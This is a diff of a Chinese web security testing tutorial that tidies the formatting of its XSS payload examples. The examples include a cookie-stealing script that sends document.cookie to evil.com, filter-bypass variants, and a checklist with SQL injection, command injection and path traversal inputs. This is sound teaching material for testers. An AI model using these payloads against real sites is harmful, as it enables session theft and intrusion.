@@ -5,14 +5,14 @@ description: Web 安全测试教程，Burp Suite、SQL 注入、XSS 和越权测
 
 > 本教程面向软件测试工程师，讲解 Web 安全测试的核心知识、常见漏洞原理与实战验证方法，覆盖 Burp Suite 使用、SQL 注入、XSS、越权等高频安全测试场景。
 
-```html
+::: v-pre
 <div class="tutorial-meta">
-```
     <span class="difficulty-badge difficulty-intermediate">📙 进阶难度</span>
     <span class="meta-item">⏱ 约 2 天</span>
     <span class="meta-item">📋 前置：HTTP 协议、接口测试基础</span>
     <span class="meta-item">🎯 目标：掌握常见 Web 漏洞的测试方法</span>
 </div>
+:::
 
 | 项目 | 要求 | 获取方式 |
 |------|------|----------|
@@ -308,24 +308,10 @@ cursor.execute(f"SELECT * FROM users WHERE name = '{username}'")
 在输入框、URL 参数、评论区等输入：
 
 ```html
-```html
-```html
-<script>
-```
-alert(1)
-</script>
-```
+<script>alert(1)</script>
 <img src=x onerror=alert(1)>
-```html
 <svg onload=alert(1)>
-```
-">```html
-```html
-<script>
-```
-alert(document.cookie)
-</script>
-```
+"><script>alert(document.cookie)</script>
 javascript:alert(1)
 ```
 
@@ -338,40 +324,18 @@ javascript:alert(1)
 
 ```html
 <!-- 基础 -->
-```html
-```html
-<script>
-```
-alert(1)
-</script>
-```
+<script>alert(1)</script>
 
 <!-- 绕过简单过滤 -->
-```html
 <ScRiPt>alert(1)</ScRiPt>
-```
-```html
-```html
-<script>
-```
-alert`1`
-</script>
-```
+<script>alert`1`</script>
 <img src=x onerror=alert(1)>
-```html
 <svg/onload=alert(1)>
 <input onfocus=alert(1) autofocus>
-```
 <details open ontoggle=alert(1)>
 
 <!-- 窃取 Cookie -->
-```html
-```html
-<script>
-```
-new Image().src="http://evil.com/?c="+document.cookie
-</script>
-```
+<script>new Image().src="http://evil.com/?c="+document.cookie</script>
 
 <!-- DOM 型 -->
 <img src=x onerror="eval(atob('YWxlcnQoMSk='))">
@@ -386,13 +350,7 @@ new Image().src="http://evil.com/?c="+document.cookie
 &lt;script&gt;alert(1)&lt;/script&gt;
 
 <!-- ❌ 不安全：原样输出 -->
-```html
-```html
-<script>
-```
-alert(1)
-</script>
-```
+<script>alert(1)</script>
 ```
 
 ---
@@ -591,13 +549,7 @@ Body: {"userId": 1001}
 ### 10.2 注入
 
 - [ ] SQL 注入：输入 `' OR '1'='1`
-- [ ] XSS：输入 ````html
-```html
-<script>
-```
-alert(1)
-</script>
-````
+- [ ] XSS：输入 `<script>alert(1)</script>`
 - [ ] 命令注入：输入 `; ls`
 - [ ] 路径遍历：输入 `../../etc/passwd`
 
